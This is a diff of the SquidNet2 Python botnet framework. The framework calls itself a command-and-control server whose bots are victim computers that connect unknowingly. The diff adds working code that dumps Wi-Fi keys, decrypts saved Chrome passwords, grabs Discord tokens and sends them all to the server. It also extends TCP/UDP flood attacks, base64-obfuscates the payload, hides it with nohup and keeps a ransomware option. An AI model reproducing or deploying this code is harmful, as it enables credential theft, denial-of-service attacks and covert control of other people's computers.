+            for i in check_networks:
+                item = subprocess.run(["netsh", "wlan", "show", "profiles", i, "key=clear"],
+                                      capture_output=True).stdout.decode()
+                wifi_pass = (re.findall("Key Content            : (.*)", item))
+                wifi_pass = wifi_pass[0]
+                info = {'ssid': i, 'key': wifi_pass.strip()}
+                passwords.append(info)
+            main_msg = ""
+            for i in passwords:
+                main_msg = main_msg + str(i) + ","
+            main_msg = f"Wifi Passwords: {main_msg}"
+            return main_msg
+    def get_encryption_key(self):
+        local_state_path = os.path.join(os.environ["USERPROFILE"],
+                                        "AppData", "Local", "Google", "Chrome",
+                                        "User Data", "Local State")
+        with open(local_state_path, "r", encoding="utf-8") as f:
+            local_state = f.read()
+            local_state = json.loads(local_state)
+        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        key = key[5:]
+        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+
+    def decrypt_password(self,password, key):
+        try:    
+            iv = password[3:15]
+            password = password[15:]
+            cipher = AES.new(key, AES.MODE_GCM, iv)
+            return cipher.decrypt(password)[:-16].decode()
+        except:
+            try:
+                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
+            except:
+                return ""
+    def main_password_yoinker(self):
+        msgtoserv = ""
+        key = self.get_encryption_key()
+        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+                               "Google", "Chrome", "User Data", "default", "Login Data")
+        filename = "ChromeData.db"
+        shutil.copyfile(db_path, filename)
+        db = sqlite3.connect(filename)
+        cursor = db.cursor()
+        cursor.execute(
+            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
+        for row in cursor.fetchall():
+            origin_url = row[0]
+            action_url = row[1]
+            username = row[2]
+            password = self.decrypt_password(row[3], key)
+            if username or password:
+                msgtoserv += f"\\nOrigin Url: {origin_url}\\nAction Url: {action_url}\\nUsername: {username}\\nPassword: {password}\\n"
+            else:
+                continue
+        cursor.close()
+        db.close()
+        try:
+            os.remove(filename)
+        except:
+            pass
+        return msgtoserv
     def exec_sql_cmd(self, sqlfile, cmd):
         sql = sqlite3.connect(sqlfile)
         cursor = sql.cursor()
@@ -4432,7 +5240,11 @@ class Bot:
                         pkt_size = int(msg_split[4])
                     except:
                         pkt_size = 1024
-                    self.tcpflood = TCP_UDP_Flood(ip, port, delay, pkt_size)
+                    try:
+                        thr_count = int(msg.split()[5])
+                    except:
+                        thr_count = 2000
+                    self.tcpflood = TCP_UDP_Flood(ip, port, delay, pkt_size, thr_count)
                     self.tcp_flood = threading.Thread(target=self.tcpflood.TCP_Flood)
                     self.tcp_flood.start()
                 elif msg.startswith("!udpflood"):
@@ -4450,9 +5262,17 @@ class Bot:
                         pkt_size = int(msg_split[4])
                     except:
                         pkt_size = 1024
-                    self.udpflood = TCP_UDP_Flood(ip, port, delay, pkt_size)
+                    try:
+                        thr_count = int(msg.split()[5])
+                    except:
+                        thr_count = 2000
+                    self.udpflood = TCP_UDP_Flood(ip, port, delay, pkt_size, thr_count)
                     self.udp_flood = threading.Thread(target=self.udpflood.UDP_Flood)
                     self.udp_flood.start()
+                elif msg.startswith("!renamefile"):
+                    og_name = msg.split()[1]
+                    new_name= msg.split()[1]
+                    os.rename(og_name,new_name)
                 elif msg.startswith("!getcwd"):
                     cwd = os.getcwd()
                     self.client.send(f"Current working directory: {os.getcwd()}".encode())
@@ -4520,6 +5340,18 @@ class Bot:
                             self.client.send(f"There was en error with decrypting file {file}.".encode())
                     else:
                         self.client.send("Cannot decrypt files due to cryptography not being installed.".encode())
+                elif msg.startswith("!getdiscordtoken"):
+                    grabber = TokenGrab()
+                    tokens = grabber.main()
+                    self.client.send(str("Tokens: "+str(tokens)).encode())
+                elif msg.startswith("!getwifipass"):
+                    self.client.send(self.obtainwifipass().encode())
+                elif msg.startswith("!getpasswords"):
+                    if sys.platform == "win32":
+                        passwords = self.main_password_yoinker()
+                        self.client.send(passwords.encode())
+                    else:
+                        self.client.send("Client not on Windows machine.".encode())
                 elif msg.startswith("!filedownload"):
                     try:
                         file = self.get_filename(msg)
@@ -4576,15 +5408,36 @@ class Bot:
                     self.client.send(output.encode())
                 except Exception as e:
                     self.client.send(f"There was an error in the Database file: {e}".encode())
-bot = Bot('"""+self.external_ip+"""',"""+str(self.external_port)+""", """+str(self.enc_key)+""")
-bot.initiate_connection()
-        """
-        return payload
+args = sys.argv
+fileargs = sys.argv[0].split("/")[len(sys.argv[0].split("/"))-1]
+if ".py" in fileargs:
+    fileargs = f'python3 {fileargs}'
+else:
+    fileargs = args[0]
+if "-u" in args or sys.platform == 'win32':
+    bot = Bot('"""+self.external_ip+"""',"""+str(self.external_port)+""", """+str(self.enc_key)+""")
+    bot.initiate_connection()
+else:
+    os.system(f"nohup {fileargs} > /dev/null -u &")
+"""+self._inject
+        _payload = f"exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('{base64.b64encode(payload.encode()).decode()}')[0]))"
+        return _payload, payload
 class AutoUpdate:
+    """
+    # Automatic Updating
+
+    This class was created for automatically updating the SquidNet2 Framework to the latest version.
+    It makes a request to the github repository 'SquidNet2Version.json' json file, and checks what
+    the latest version of the server is, according to what the file says. If the version on this 
+    script(referred to via the `self.version` variable) is less than the version on the json file,
+    the user will be prompted to update. If the user says yes to updating, the contents of this
+    script will be completely wiped, and replaced with the new one.
+    """
     def __init__(self):
-        self.version = 4.5
+        self.version = 5.0
     def check_update(self):
-        print(BotNet.logo(None))
+        """Sends the request to the github repository, and checks to see if the script needs and update."""
+        print(SquidNet.logo.fget())
         print("[+] Checking for updates.....")
         version = self.version - 1.0
         updated = False
@@ -4600,31 +5453,315 @@ class AutoUpdate:
             print("[+] There was an error with checking updates, starting SquidNet2.")
         if version > self.version:
             print(f"[+] Your Version of SquidNet2 is outdated. You have version {self.version}, whereas the current update is version v{version}.")
-            update = input("\n[+] Do you wish to update?(y/n): ").lower()
-            if update == "y" or update == "yes":
-                print(f"[+] Updating SquidNet2 to v{version}")
-                updated = True
-                req = urllib.request.Request(url="https://raw.githubusercontent.com/DrSquidX/SquidNet2/main/MainScripts/SquidNet2.py")
-                resp = urllib.request.urlopen(req).read()
-                file = open(sys.argv[0],"wb")
-                file.write(resp)
-                file.close()
+            if sys.argv[0].endswith(".py"):
+                update = input("\n[+] Do you wish to update?(y/n): ").lower()
+                if update == "y" or update == "yes":
+                    print(f"[+] Updating SquidNet2 to v{version}")
+                    updated = True
+                    req = urllib.request.Request(url="https://raw.githubusercontent.com/DrSquidX/SquidNet2/main/MainScripts/SquidNet2.py")
+                    resp = urllib.request.urlopen(req).read()
+                    file = open(sys.argv[0],"wb")
+                    file.write(resp)
+                    file.close()
+                else:
+                    print("[+] Choosing not to update.")
             else:
-                print("[+] Choosing not to update.")
+                updated = False
+                print("[+] Not updating due to the file not being a '.py'.\n[+] Starting SquidNet2 in 3 seconds.....")
+                time.sleep(3)
         if not updated:
             if sys.platform == "win32":
                 os.system("cls")
             else:
                 os.system("clear")
             Squidnet = Config(self.version)
-            Squidnet.read_config()
         else:
             print("[+] Restart the Script to have the Update be effective!")
 class Config:
-    """Class needed for using the config file."""
+    """
+    # Configuration
+
+    This class is needed for configuring the settings that allow the server to function properly.
+    There are 2 choices of configuration: Option-Parsing and the usage of a Config file."""
     def __init__(self, version):
         self.version = version
         self.config_file = "server.config"
+        self.filearg = sys.argv[0].split("/")[len(sys.argv[0].split("/"))-1]
+        if ".py" in self.filearg:
+            self.filearg = f"python3 {self.filearg}"
+        self.parse_args()
+    def information(self):
+        print(f"""[+] SquidNet2: The Sequel to SquidNet that nobody asked for, but everyone needed.
+[+] Written in Python 3.8.3
+
+[+] Why SquidNet2?
+    SquidNet2 offers all of the features(except for SSH, just use SquidNetSSH) that the original had,
+    but better. One prime example is the significantly improved web interface, with many others like
+    more security and more stability. There are more functions that were built on top of the original
+    and there are more possibilities with SquidNet2 that are achievable compared to SquidNet.
+
+[+] The SquidNet2 Framework:
+    SquidNet2 - Server:
+        This script is the server part of the SquidNet2 framework. It is the foundation and handler of
+        all the bots and admin connections. It acts as a command and control server, where the bots connect
+        to this server, and the admin also has to as well, to then execute commands on this server. This
+        is so that the admins can communicate and connect to the server wherever and whenever they want,
+        as long as the Server itself is up.
+    SquidNet2 - Admin:
+        While this acts as the handler to ensure control of remote computers, there still needs to be an admin
+        that is able to remotely execute commands on the bot computers. This is where the admin comes into
+        play. The admin connects to the server, and logs into the admin account that has been configured
+        when the server had started. Once authentication is complete, the admin will have access to the server
+        and all of the bots that are connected to it.
+    SquidNet2 - Bots:
+        The bots are the victim computers that will unknowingly connect to the SquidNet2 server. There is a
+        payload that is automatically generated by the server that can then be run by victim computers and
+        connect to that server specifically. There are numerous commands that are built into the payload,
+        which the admin of the server can run them to extract information or run commands remotely on those
+        computers. These bots can also run shell commands, if there are not any commands being sent that are
+        part of the in-built commands that the payload provides.
+
+[+] Usefulness and function of SquidNet2:
+    - Remotely accessing lost computers
+    - Taking control of other people's computers(illegal without consent)
+    - Penetration Testing
+    - Impressive
+    - Lots of options for overall better experience
+
+[+] Risks:
+    - Being careless and taking control of computers, which is illegal.
+    - Server might not be up to security standards(need to improve authentication)
+
+[+] Topology of the SquidNet2 Framework:
+             _________  
+             |       |   - Admin
+             | Admin |     Sends commands to the server.
+             |_______|     The admin also recieves messages
+                           from the server with information         
+                 ^         regarding command output, or other
+                 |         important info on the server's 
+                 |         status.
+                 V 
+            ____________
+            |          |   - Server
+            |  Server  |     Recieves the Admin's instruction
+            |          |     and sends it to the bots
+            |__________|     It also recieves bot output and sends
+          ^      ^       ^   it to the admin.
+         /       |        \\
+        /        |         \\
+       V         V          V
+   _________  _________  _________  - Bots
+   |       |  |       |  |       |    Recieves the command via the server,
+   |  Bot  |  |  Bot  |  |  Bot  |    executes it and sends any output back.
+   |_______|  |_______|  |_______|    They are being remotely controlled.
+[+] Key:
+    <-->(arrows) - Indicate direction of messages and packets
+    '-'          - Notations
+
+[+] Features:
+    Web Interface:
+        A web interface that cleanly shows information about the bots in
+        nice tables, with the additional ability to also be able to run
+        commands via the web interface to the bots and more. There is 
+        information displayed that shows the settings and configuration of
+        the server, giving the user information that shows what the server 
+        is using to function.
+    Options for Server configuration:
+        There is the ability to use the option-parsing that most scripts
+        use, or to use a configuration file that allows for quick and
+        easy configuration, and allows the server to be started quicker
+        without needing to constantly type the same credentials over and
+        over again.
+    Numerous Commands:
+        {SquidNet.help_msg.fget(None).replace("[+]","       ").replace("[(SERVER)]: Info about each command:","   ").replace("!","    !").strip()}
+        
+[+] For your information:
+    Read the github README.md file for more information on the SquidNet2 framework.
+    This script was made for educational purposes only. Any illegal use of this
+    script not caused by the developer is not responsible for any damages done.
+    This script follows this license(MIT):
+    ''' MIT License
+        
+        Copyright (c) 2022 DrSquidX
+
+        Permission is hereby granted, free of charge, to any person obtaining a copy
+        of this software and associated documentation files (the "Software"), to deal
+        in the Software without restriction, including without limitation the rights
+        to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+        copies of the Software, and to permit persons to whom the Software is
+        furnished to do so, subject to the following conditions:
+
+        The above copyright notice and this permission notice shall be included in all
+        copies or substantial portions of the Software.
+
+        THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+        IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+        FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+        AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+        LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+        OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+        SOFTWARE.
+    '''
+    Thank you for agreeing with these terms.
+
+[+] Overall:
+    SquidNet2 is the far superior version of SquidNet, with many features that were
+    reused and improved onto, as well as many new features being added to increase the
+    stability and function of the framework.
+
+[+] Happy (Ethical) Hacking! - DrSquid
+""")
+        sys.exit()
+    def help_msg(self):
+        print(f"""
+Usage: {self.filearg} [options..]
+
+Options:
+  -h, --help            Show this help message and exit.
+  --ip, --ipaddr        The IP Address that the server will bind to.(required)
+  --p, --port           The port that will bind to the IP address.(default:
+                        8080)
+  --eip, --externalip   The external IP that Bots will connect to.(default:
+                        opt.ip)
+  --ep, --externalport  The external Port that Bots will connect to.(default:
+                        opt.p)
+  --ek, --enckey        The encryption key used on the bots for file
+                        encryption.(default:
+                        b'iC0g4NM4xy5JrIbRV-8cZSVgFfQioUX8eTVGYRhWlF8=')
+  --l, --logfile        The file used for server logging.(default: log.txt)
+  --au, --adminuser     The username for the admin account.(default: admin)
+  --ap, --adminpass     The password for the admin account.(default:
+                        adminpassword12345)
+  --fd, --ftpdir        The main directory for File Transferring.(default:
+                        Bot_Files)
+  --if, --injectfile    A custom injection file that you might want to 
+                        include with the SquidNet payload(default: None)    
+  --r, --ransomware     Whether the ransomware payload on the bots can be
+                        used(default: False)
+  --c, --config         Whether to use a config file for server
+                        configuration.(default: False)
+  --i, --info           Information about the SquidNet2 
+                        Framework.(default: False)
+  --pn, --patchnotes    Shows information on the latest patch on
+                        SquidNet2.(default: False)
+Examples: 
+  {self.filearg} --ip localhost --p 8080 --eip 1.2.3.4 --ep 80 --r
+  {self.filearg} --c
+        """)
+        sys.exit()
+    def patch_notes(self):
+        print(f"""
+[+] Whats new in SquidNet2 v{self.version}:
+    - Many bug fixes
+    - Numerous typos fixed
+    - Changed password hashing algorithm(sha256->SquidHash)
+    - Added Web interface for server-side script(binds to 'localhost:8000')
+    - Made payload more hidden('nohup' command execution for OSX and Linux)
+    - Added base64 encoded payload
+    - Added Option-parsing
+    - Added information message('--i')
+    - Changed 'self.listen()' function(old one will be deleted soon)
+    - Finally implemented properties
+    - Added '!getpasswords, !getdiscordtoken, !getwifipasswords' commands
+    - Readded older features from the original SquidNet(old commands, web interface, etc.)
+    - Added developer notes in the source code
+    - Made things a little more professional looking
+
+[+] Read the github README or read the developer notes for more information.
+        """)
+        sys.exit()
+    def parse_args(self):
+        global SquidNet
+        """
+        # Option Parsing
+
+        This is the main function for option parsing.
+        """
+        args = OptionParser(add_help_option=False)
+        args.add_option('-h','--help', dest="h",action="store_true",help='Show this help message and exit.')
+        args.add_option("--ip","--ipaddr",dest="ip",help="The IP Address that the server will bind to.(required)")
+        args.add_option("--p","--port",dest="p",help="The port that will bind to the IP address.(default: 8080)")
+        args.add_option("--eip","--externalip",dest="eip",help="The external IP that Bots will connect to.(default: opt.ip)")
+        args.add_option("--ep","--externalport",dest="ep",help="The external Port that Bots will connect to.(default: opt.p)")
+        args.add_option("--ek","--enckey",dest="ek",help="The encryption key used on the bots for file encryption.(default: b'iC0g4NM4xy5JrIbRV-8cZSVgFfQioUX8eTVGYRhWlF8=')")
+        args.add_option("--l","--logfile",dest="l",help="The file used for server logging.(default: log.txt)")
+        args.add_option("--au","--adminuser",dest="au",help="The username for the admin account.(default: admin)")
+        args.add_option("--ap","--adminpass",dest="ap",help="The password for the admin account.(default: adminpassword12345)")
+        args.add_option("--fd","--ftpdir",dest="fd",help="The main directory for File Transferring.(default: Bot_Files)")
+        args.add_option("--r","--ransomware",dest="r",action="store_true",help="Whether the ransomware payload on the bots can be used(default: False)")
+        args.add_option("--c","--config",dest="c",action="store_true",help="Whether to use a config file for server configuration.(default: False)")
+        args.add_option("--i","--info",dest="i",action="store_true",help="Information about the SquidNet2 Framework.(default: False)")
+        args.add_option("--if","--injectfile",dest="inf",help="A custom injection python file that you might want to include with the SquidNet payload(default: None)")
+        args.add_option("--pn","--patchnotes",action="store_true",dest="pn",help="Shows information on the latest patch on SquidNet2(default: False)")
+        opt, arg = args.parse_args()
+        print(SquidNet.logo.fget())
+        missing_args = False
+        usingconf = False
+        if opt.h is not None:
+            self.help_msg()
+        if opt.c is not None:
+            self.read_config()
+            usingconf = True
+        if opt.i is not None:
+            self.information()
+        if opt.pn is not None:
+            self.patch_notes()
+        if not usingconf:
+            if opt.ip is None:
+                ip = None
+                missing_args = True
+            else:
+                ip = opt.ip
+            if opt.p is None:
+                p = 8080
+            else:
+                p = int(opt.p)
+            if opt.eip is None:
+                eip = ip
+            else:
+                eip = opt.eip
+            if opt.ep is None:
+                ep = p
+            else:
+                ep = int(opt.ep)
+            if opt.ek is None:
+                ek = b'iC0g4NM4xy5JrIbRV-8cZSVgFfQioUX8eTVGYRhWlF8='
+            else:
+                ek = str(opt.ek).encode()
+            if opt.l is None:
+                l = "log.txt"
+            else:
+                l = opt.l
+            if opt.au is None:
+                au = "admin"
+            else:
+                au = opt.au
+            if opt.ap is None:
+                ap = "adminpassword12345"
+            else:
+                ap = opt.ap
+            if opt.fd is None:
+                fd = "Bot_Files"
+            else:
+                fd = opt.fd
+            if opt.r is not None:
+                r = True
+            else:
+                r = False
+            if opt.inf is not None:
+                inf = opt.inf
+            else:
+                inf = None
+            if missing_args:
+                self.help_msg()
+            else:
+                if sys.platform == "win32":
+                    os.system("cls")
+                else:
+                    os.system("clear")
+                Squidnet = SquidNet(ip, p, self.version, eip, ep, au, ap, l, ek, fd, r, inf)
+                Squidnet.start()
     def read_config(self):
         """The config file is read here, where the variables that are in the file are used for the main server."""
         try:
@@ -4655,14 +5792,18 @@ class Config:
                         ransomware_active = False
                     else:
                         ransomware_active = True
-            Squidnet = BotNet(hostip, hostport, self.version, external_host, external_port, admin_name, admin_password, logfile, enc_key, ftp_dir, ransomware_active)
+                elif i.startswith("\ninjectfile") or i.startswith("injectfile"):
+                    injectfile = i.replace("=","").split()[1]
+                    if injectfile == "None":
+                        injectfile = None
+            Squidnet = SquidNet(hostip, hostport, self.version, external_host, external_port, admin_name, admin_password, logfile, enc_key, ftp_dir, ransomware_active, injectfile)
             Squidnet.start()
         except Exception as e:
             self.gen_config_file()
     def gen_config_file(self):
         """If there is an error in the usage of the config file, a new config file will be generated, and the user can simply 
         restart the script to have a functional server."""
-        print(BotNet.logo(None))
+        print(SquidNet.logo.fget())
         print("[+] There is an error in the config file. Re-writing and re-formatting to be able to be used by the server.")
         gen_content = """
 hostip = localhost
@@ -4675,10 +5816,13 @@ admin_password = adminpassword12345
 enc_key = iC0g4NM4xy5JrIbRV-8cZSVgFfQioUX8eTVGYRhWlF8=
 ftp_dir = Bot_Files
 ransomware_active = f
+injectfile = None
 """
         file = open(self.config_file,"w")
         file.write(gen_content)
         file.close()
         print("[+] The Config file has been reformatted and is now usable by the server! Restart the script to start the server.")
-item = AutoUpdate()
-item.check_update()
+        
+if __name__ == "__main__":
+    SquidNet2 = AutoUpdate()
+    SquidNet2.check_update()
